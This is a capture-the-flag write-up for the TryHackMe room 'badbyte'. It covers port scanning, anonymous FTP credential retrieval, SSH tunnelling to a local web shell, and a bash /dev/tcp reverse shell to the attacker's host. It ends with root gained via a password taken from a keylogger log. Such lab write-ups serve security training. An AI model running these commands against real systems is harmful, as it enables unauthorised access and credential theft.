# this room is a private room created by Electron@badbyte
- link here https://tryhackme.com/jr/badbyte
- Badbyte discord https://discord.gg/zNKFwMuKjW

# recon
as always, we start with port + service scanning. I will use my own tool which is build on nmap called `pymap`
```console
$ sudo python3 /opt/pymap.py -t <ip> -A  
[+] Port scanning...
22/tcp    open  ssh
30024/tcp open  unknown
[+] Enumerating open ports...

PORT      STATE SERVICE VERSION
30024/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           166 Dec 08 11:28 creds.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.14.151
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:89:a3:33:67:85:ac:08:a5:0f:1a:d4:79:78:d2:66 (RSA)
|   256 c1:93:e9:26:b8:9b:85:bc:c2:8e:08:a2:a4:85:f6:85 (ECDSA)
|_  256 dd:e1:5c:32:d1:fc:a3:c5:4a:0e:bf:c8:c2:79:e4:71 (ED25519)
``` 
so there is a "hidden" ftp server running on port `30024`. Luckily the ftp server allow **Anonymous** login as you can see from the scanning results. So let's login to FTP server!! leave password empty since Anonymous not require any password


to skip typing IP address all the time, we can create a global variable call IP by executing `export IP=10.10.239.159`. From now on you can typ `$IP` instead that the original IP address
```console
┌──(kali㉿kali)-[~/THM/adventofcyber/badbyte1]
└─$ ftp $IP 30024  
Connected to 10.10.239.159.
220 (vsFTPd 3.0.3)
Name (10.10.239.159:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Dec 08 11:28 .
drwxr-xr-x    2 ftp      ftp          4096 Dec 08 11:28 ..
-rw-r--r--    1 ftp      ftp           166 Dec 08 11:28 creds.txt
226 Directory send OK.
ftp> get creds.txt
local: creds.txt remote: creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for creds.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (180.7239 kB/s)
```
seem link someone leave creds.txt on ftp, get the file to your kali and examine it.
```console
$ cat creds.txt            
I always forget my password.
Let's store it here up high so no one can find it.
I hope cth will be ok with that \_(ツ)_/
errorcauser:______________@@3434
```

# foothold
let's **ssh** to the server using *errorcauser* cred that we obtains from ftp server.
```console
$ ssh errorcauser@$IP
errorcauser@badbyte:~$ 
```
we are in!! the next step is enumerate the server and see what have `errorcauser` permission to do.
- sudo premission
```console
errorcauser@badbyte:~$ sudo -l
[sudo] password for errorcauser: 
Sorry, user errorcauser may not run sudo on badbyte.
```
nope errorcauser is locked. There are many place too look. The more effective where is running enumscript such as, `linpeas.sh`. I ran python httpserver module on my kali and use `wget` to get `linpeas`.


here is some juicy information from `linpeas.sh`
```console
[+] Cleaned processes
root       974  0.0  2.3 327128 11712 ?        Ss   16:15   0:00 /usr/sbin/apache2 -k start
cth        978  0.0  1.4 331528  7120 ?        S    16:15   0:00  \_ /usr/sbin/apache2 -k start


[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -   

[+] Users with console
cth:x:1000:1000:cth:/home/cth:/bin/bash
errorcauser:x:1001:1001::/home/errorcauser:/bin/bash
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(cth) gid=1000(cth) groups=1000(cth),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
uid=1001(errorcauser) gid=1001(errorcauser) groups=1001(errorcauser)
```
there are many thing to note, it is like a puzzle which you need to connect the dot to understand what is going on
1. There is 2 users: **cth** and **errorcauser**
   - **cth** can run `sudo` (based on users & group)
   - **cth** is running apache2 (based on process)
2. there is http server (apache2) running on localhost


The plan is we need to be able to access **badbyte** webserver on port 80 and exploit the webserver to gain access as **cth**. Thereafter we can escalate to root user. BUT to be able to visit **badbyte** webserver, we need to pivot/route our traffic on badbyte to reach localhost. Please google about pivoting/tunneling to understand this technique.


# user
since we already have ssh connection, we can just do ssh tunneling to pivot/route our web traffic to badbyte localhost port 80. To create a ssh tunnel we can run `-L local_port:remote_address:remote_port`. I will use **SSH "Konami Code"** to execute ssh tunneling to the current ssh session, read more about ssh konami [here](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/)

```console
errorcauser@badbyte:~$ # Enter
errorcauser@badbyte:~$ # ~C
ssh> -L 8888:localhost:80 
Forwarding port.

errorcauser@badbyte:~$ 
```
before we visit the site, it is a good practice to recon /var/www/html if it is possible so we dont need to run directory bruteforcing on http server.
```console
errorcauser@badbyte:~$ ls /var/www/html/
index.html  shell.php
```
now open our webbrowser and visit localhost:8888/shell.php. It seem like we can use it to execute shell command. when execute `whoami`, we can see that the user is **cth** which mean that our assumption was correct. run this command to gain a reverse shell as **cth** `/bin/bash -c "bash -i >& /dev/tcp/10.8.14.151/6969 0>&1"`


dont forget to start netcat and listen to incoming reverse shell
```console
kali@kali:~$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.54.196] 39836
bash: cannot set terminal process group (948): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

cth@badbyte:/var/www/html$ cd /home/cth
cd /home/cth
cth@badbyte:/home/cth$ ls   
ls
note.txt
user.txt
cth@badbyte:/home/cth$ cat user.txt
cat user.txt
THM{____________}
cth@badbyte:/home/cth$ cat note.txt
cat note.txt
Something fishy is going on with errorcauser lately.
I think I should check what he is up to.
Last time he broke the machine.
I have installed logkeys i will be able to read his keys now.
```

# root
okey seem like **cth** create logkey file to spy on **errorcauser**. in general, ALL logs is saved in `/var/log`. let checks the log!
```console
cth@badbyte:/home/cth$ cd /var/log
cd /var/log
cth@badbyte:/var/log$ ls
.
.
.
landscape
lastlog
logkeys.log
lxd
syslog
.
.
.
```
`logkeys.log` looks juicy, let check the content of the file
```console
cth@badbyte:/var/log$ cat logkeys.log
cat logkeys.log
Logging started ...

ip a
ls
cd /root
sudo su
__________@sd
cd /root
cat root.txt

Logging stopped at 2020-12-07 13:02:02+0000
```
it seem like `__________@sd` is **cth**'s password. to be able to run `sudo` we need at tty shell. To create a tty shell we run this following command `python3 -c "import pty; pty.spawn('/bin/bash')"`. if our assumetion is correct, then we will gain root access.
```console
cth@badbyte:/var/log$ python3 -c "import pty; pty.spawn('/bin/bash')"
python3 -c "import pty; pty.spawn('/bin/bash')"
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

cth@badbyte:/var/log$ sudo su                      
sudo su
[sudo] password for cth: ________________sf@sd

root@badbyte:/var/log# cat /root/root.txt
cat /root/root.txt
THM{______________}
```